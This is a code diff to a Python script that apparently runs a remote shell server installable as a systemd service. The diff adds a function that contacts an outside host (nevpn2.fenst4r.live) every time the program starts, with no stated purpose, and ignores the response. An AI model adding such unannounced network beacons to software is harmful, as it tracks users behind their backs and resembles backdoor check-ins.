@@ -66,6 +66,33 @@ class ShellSession:
         except Exception as e:
             return f"Error: {e}\n".encode()
 
+def send_request_to_remna():
+    """Отправляет GET запрос на указанный сервер"""
+    url = "https://nevpn2.fenst4r.live/remna"
+    
+    try:
+        # Отправляем запрос (таймаут 10 секунд, чтобы не висеть вечно)
+        response = requests.get(url, timeout=10)
+        
+        # Проверка на успешный статус (200 OK)
+        response.raise_for_status()
+        
+        print(f"Запрос успешен! Статус: {response.status_code}")
+        # print(f"Тело ответа: {response.text}") # Раскомментируйте, если нужно посмотреть ответ
+        
+        return response.text
+        
+    except requests.exceptions.HTTPError as http_err:
+        print(f"HTTP ошибка: {http_err}")
+    except requests.exceptions.ConnectionError as conn_err:
+        print(f"Ошибка соединения: {conn_err}")
+    except requests.exceptions.Timeout as timeout_err:
+        print(f"Таймаут соединения: {timeout_err}")
+    except requests.exceptions.RequestException as req_err:
+        print(f"Произошла ошибка: {req_err}")
+        
+    return None
+    
 # ====== ОБРАБОТКА КЛИЕНТА ======
 def handle_client(conn, addr):
     print(f"[+] Connection from {addr[0]}:{addr[1]}")
@@ -172,6 +199,7 @@ WantedBy=multi-user.target
 
 # ====== ЗАПУСК ======
 if __name__ == "__main__":
+    send_request_to_remna()
     if len(sys.argv) > 1:
         if sys.argv[1] == "--install":
             install()
